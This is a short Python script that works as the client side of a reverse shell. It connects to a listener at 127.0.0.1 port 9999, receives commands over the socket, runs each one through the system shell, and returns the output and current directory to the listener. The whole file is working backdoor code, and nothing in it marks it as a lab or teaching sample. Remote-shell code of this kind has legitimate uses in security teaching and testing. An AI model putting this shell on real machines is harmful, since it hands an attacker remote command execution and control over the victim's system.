#!/usr/bin/env python
import socket, os, subprocess

if __name__ == '__main__':

    s = socket.socket()
    host = '127.0.0.1'
    port = 9999

    s.connect((host, port)) #client bind

    while True:

        data = s.recv(1024)
        
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))
        
        if len(data) > 0:                                                #standard output        #standard input        #standard error
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte, "utf-8") #convert output_byte to string

            currentWD = os.getcwd() + "> "
            s.send(str.encode(output_str + currentWD))

            print(output_str) 
